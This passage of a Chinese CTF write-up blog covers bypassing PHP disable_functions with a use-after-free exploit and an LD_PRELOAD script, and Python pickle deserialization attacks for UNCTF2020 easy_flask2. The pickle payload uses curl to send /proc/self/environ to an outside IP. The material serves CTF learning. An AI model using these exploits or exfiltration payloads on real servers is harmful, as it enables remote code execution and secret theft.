invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;ls -l&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是UAF脚本，放在cmd参数后面，再转义一下，最后是执行的命令，就可以读出flag了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666580791965-19ca1eba-ee5a-42e4-8ebc-bc4d413c2009.png#averageHue=%23f6efda&clientId=u2f995af4-ad59-4&from=paste&height=97&id=ubc54e87b&name=image.png&originHeight=121&originWidth=1445&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17215&status=done&style=none&taskId=u6255083d-9f02-4f4f-bef2-97c1877c9c4&title=&width=1156" alt="image.png"><br>由于是pwn的知识我也不是很懂，似乎是跟指针为NULL有关</p>
<p>方法二：<br>使用动态链接库—— LD_PRELOAD，因为 LD_PRELOAD允许我们在执行程序<strong>之前优先加载</strong>动态链接库。利用这个，我们就可以使用自己的函数，同时我们也可以向别人的程序注入恶意程序，从而达到我们的目的。<br>不难理解，也就是上传木马：<br>里面有绕过禁用函数的so和php文件<br><strong>突破思路</strong>：</p>
<ol>
<li>创建新进程</li>
<li>用c编写我们的恶意代码，将其转化为 so文件</li>
<li>让我们的 <strong>so文件为LD_PRELOAD</strong></li>
<li>让我们的 so文件优先加载</li>
<li>运行主体 php函数</li>
</ol>
<p>经过测试，只有tmp文件可以上传文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666580927611-5fe81868-516d-4fd0-b240-15794d832a72.png#averageHue=%23f2f2f2&clientId=u2f995af4-ad59-4&from=paste&height=141&id=ufdf20416&name=image.png&originHeight=176&originWidth=1053&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12128&status=done&style=none&taskId=u711e2ccc-0259-49ba-9b94-0f576233834&title=&width=842.4" alt="image.png"><br>改了个名字更方便，123.php的内容是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: </span></span><br><span class="line"><span class="string">&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还是看得懂一点的，动态链接库加载SO文件，然后运行SO文件中的函数，就绕过了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666581009662-0f0316df-312c-42d3-9d51-3e84b72cb6bc.png#averageHue=%238a8a89&clientId=u2f995af4-ad59-4&from=paste&height=762&id=u7dead17d&name=image.png&originHeight=953&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86198&status=done&style=none&taskId=u889c13b0-1b9c-497c-b888-76f5ea0712e&title=&width=1536" alt="image.png"><br>就这么多啦~</p>
<p>参考文献：</p>
<p>受益匪浅</p>
<h2 id="UNCTF2020-easy-flask2"><a href="#UNCTF2020-easy-flask2" class="headerlink" title="[UNCTF2020]easy_flask2"></a>[UNCTF2020]easy_flask2</h2><p>其实这也不算BUUCTF上的题，但是图个方便记在这里<br>我愿称之为pickle反序列化从0到1！<br>我强烈推荐这位师傅的博客<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a><br>写的很好，看了一个多小时了，看懂了，感觉收获还是挺大的，之前一直做php的反序列化，这次是python的反序列化，受益匪浅<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666630403150-85c0b00b-3fdf-4c56-8ebb-477fbc181036.png#averageHue=%23423f36&clientId=u2b89841e-5463-4&from=paste&height=605&id=u298383ac&name=image.png&originHeight=756&originWidth=1261&originalType=binary&ratio=1&rotation=0&showTitle=false&size=301046&status=done&style=none&taskId=u44244558-4916-4996-b3c6-d8823979d96&title=&width=1008.8" alt="image.png"><br>有点涉及pwn的知识，不过还是可以勉强理解的<br>常用opcode：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">指令	描述	具体写法	栈上的变化</span><br><span class="line">c	获取一个全局对象或import一个模块	c[module]\n[instance]\n	获得的对象入栈</span><br><span class="line">o	寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）	o	这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</span><br><span class="line">i	相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）	i[module]\n[callable]\n	这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</span><br><span class="line">N	实例化一个None	N	获得的对象入栈</span><br><span class="line">S	实例化一个字符串对象	S&#x27;xxx&#x27;\n（也可以使用双引号、\&#x27;等python字符串形式）	获得的对象入栈</span><br><span class="line">V	实例化一个UNICODE字符串对象	Vxxx\n	获得的对象入栈</span><br><span class="line">I	实例化一个int对象	Ixxx\n	获得的对象入栈</span><br><span class="line">F	实例化一个float对象	Fx.x\n	获得的对象入栈</span><br><span class="line">R	选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数	R	函数和参数出栈，函数的返回值入栈</span><br><span class="line">.	程序结束，栈顶的一个元素作为pickle.loads()的返回值	.	无</span><br><span class="line">(	向栈中压入一个MARK标记	(	MARK标记入栈</span><br><span class="line">t	寻找栈中的上一个MARK，并组合之间的数据为元组	t	MARK标记以及被组合的数据出栈，获得的对象入栈</span><br><span class="line">)	向栈中直接压入一个空元组	)	空元组入栈</span><br><span class="line">l	寻找栈中的上一个MARK，并组合之间的数据为列表	l	MARK标记以及被组合的数据出栈，获得的对象入栈</span><br><span class="line">]	向栈中直接压入一个空列表	]	空列表入栈</span><br><span class="line">d	寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）	d	MARK标记以及被组合的数据出栈，获得的对象入栈</span><br><span class="line">&#125;	向栈中直接压入一个空字典	&#125;	空字典入栈</span><br><span class="line">p	将栈顶对象储存至memo_n	pn\n	无</span><br><span class="line">g	将memo_n的对象压栈	gn\n	对象被压栈</span><br><span class="line">0	丢弃栈顶对象	0	栈顶对象被丢弃</span><br><span class="line">b	使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置	b	栈上第一个元素出栈</span><br><span class="line">s	将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中	s	第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</span><br><span class="line">u	寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中	u	MARK标记以及被组合的数据出栈，字典被更新</span><br><span class="line">a	将栈的第一个元素append到第二个元素(列表)中	a	栈顶元素出栈，第二个元素（列表）被更新</span><br><span class="line">e	寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中	e	MARK标记以及被组合的数据出栈，列表被更新</span><br></pre></td></tr></table></figure>
<p>这些都挺有用的，就简单介绍一个例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.age=<span class="number">18</span></span><br><span class="line">        self.name=<span class="string">&quot;Pickle&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">r&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#xiaoh\34946</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上下2个文件效果都一样，一个是reduce魔术方法触发，一个是我们自己写opcode来触发，神奇不？，pickle.loads对应的是R阶段，也就是弹出的阶段<br>可以理解为就是执行吧（应该）</p>
<p>废话不多说来看一下题目<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666630718322-9a285254-53b3-4482-919f-0d33aee9de97.png#averageHue=%23674da1&clientId=u2b89841e-5463-4&from=paste&height=222&id=ueed2cd0f&name=image.png&originHeight=277&originWidth=1410&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67330&status=done&style=none&taskId=udc78b502-2c57-4924-b497-260520e0e92&title=&width=1128" alt="image.png"><br>叫我们输入名字，先看看源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666630728572-da287453-b611-4c1c-ac93-22f16307fdd1.png#averageHue=%23fcfcfc&clientId=u2b89841e-5463-4&from=paste&height=70&id=u0c2c204b&name=image.png&originHeight=88&originWidth=508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2320&status=done&style=none&taskId=u6ce8e0e9-c092-4d54-8148-20ef60994ec&title=&width=406.4" alt="image.png"><br>发现了个路由：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect,request,session,make_response</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, is_admin</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.is_admin = is_admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = config.secret_key</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;login&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.form.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        person = Person(name,<span class="number">0</span>)</span><br><span class="line">        pkl = pickle.dumps(person)</span><br><span class="line">        pkl = base64.b64encode(pkl)</span><br><span class="line"></span><br><span class="line">        resp = make_response(name)</span><br><span class="line">        resp.set_cookie(<span class="string">&#x27;pkl&#x27;</span>,pkl)</span><br><span class="line"></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        session[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span>   base64.b64decode(request.cookies[<span class="string">&#x27;pkl&#x27;</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;RCE??&quot;</span></span><br><span class="line">            person = pickle.loads(base64.b64decode(request.cookies[<span class="string">&#x27;pkl&#x27;</span>]))</span><br><span class="line">            <span class="built_in">print</span>(person.is_admin)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;is_admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">                <span class="comment">#person = pickle.loads(base64.b64decode(request.cookies[&#x27;pkl&#x27;]))</span></span><br><span class="line">                <span class="keyword">if</span> person.is_admin == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;HHHacker!Here is Your flag : &quot;</span> + flag</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;pkl&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/source&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;code.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获得了源代码，可以审计一下<br>审计一番可以发现，在&#x2F;login处存在pickle反序列化，我们可以看到有个<code>pickle.loads</code>函数，这就是我们的触发点，我们来手写一波opcode：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;curl -F &quot;filename=@/proc/self/environ&quot; 43.140.251.169:7777&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>一个简单的rce的opcode,这个其实大多数人都想不到的，你不知道FLAG在环境变量里<br>base64加密一下，然后vps起个监听就好了，有人可能会问反弹shell呢？不存在啊，我试过了，反弹shell无效<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666635376421-f8cdc3a7-5fa6-4c0d-8c60-2f5e11a996e8.png#averageHue=%230e0b0a&clientId=u2b89841e-5463-4&from=paste&height=174&id=u403b876c&name=image.png&originHeight=218&originWidth=1552&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30189&status=done&style=none&taskId=u6075e1ee-a086-439c-84d8-4500a5cfde5&title=&width=1241.6" alt="image.png"></p>
<p>方法二：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">secret = GLOBAL(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">secret.secret_key = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">person = INST(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;Person&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> person</span><br></pre></td></tr></table></figure>
<p>用pker脚本去生成payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">secret = GLOBAL(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">secret.secret_key = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">person = INST(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;Person&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> person</span><br></pre></td></tr></table></figure>
<p>运行指令<code>python pker.py &lt; pker.txt</code><br>之后就会生成：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&quot;c__main__\nconfig\np0\n0g0\n(&#125;(S&#x27;secret_key&#x27;\nS&#x27;hello&#x27;\ndtb(S&#x27;admin&#x27;\nI1\ni__main__\nPerson\np2\n0g2\n.&quot;</span></span><br></pre></td></tr></table></figure>
